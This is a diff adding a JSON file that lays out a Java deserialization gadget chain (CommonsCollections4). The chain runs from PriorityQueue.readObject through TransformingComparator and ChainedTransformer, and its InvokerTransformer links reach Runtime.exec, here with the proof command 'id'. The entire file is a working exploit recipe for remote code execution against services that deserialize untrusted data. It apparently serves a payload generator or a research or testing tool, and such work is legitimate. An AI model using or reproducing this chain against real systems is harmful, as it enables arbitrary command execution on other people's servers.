@@ -1,0 +1,56 @@
+{
+  "chain_type": "CommonsCollections4 — PriorityQueue + TransformingComparator + ChainedTransformer (CC 4.x)",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→siftDown→comparator.compare",
+  "links": [
+    {
+      "class": "org.apache.commons.collections4.comparators.TransformingComparator",
+      "field_overrides": {
+        "transformer": {"$ref": "link:1"},
+        "decorated": null
+      }
+    },
+    {
+      "class": "org.apache.commons.collections4.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:2"},
+          {"$ref": "link:3"},
+          {"$ref": "link:4"},
+          {"$ref": "link:5"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections4.functors.ConstantTransformer",
+      "field_overrides": {
+        "iConstant": "java.lang.Runtime"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections4.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "getMethod",
+        "iParamTypes": ["java.lang.String", "[Ljava.lang.Class;"],
+        "iArgs": ["getRuntime", []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections4.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "invoke",
+        "iParamTypes": ["java.lang.Object", "[Ljava.lang.Object;"],
+        "iArgs": [null, []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections4.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "exec",
+        "iParamTypes": ["java.lang.String"],
+        "iArgs": ["id"]
+      }
+    }
+  ],
+  "sink_method": "Runtime.exec"
+}
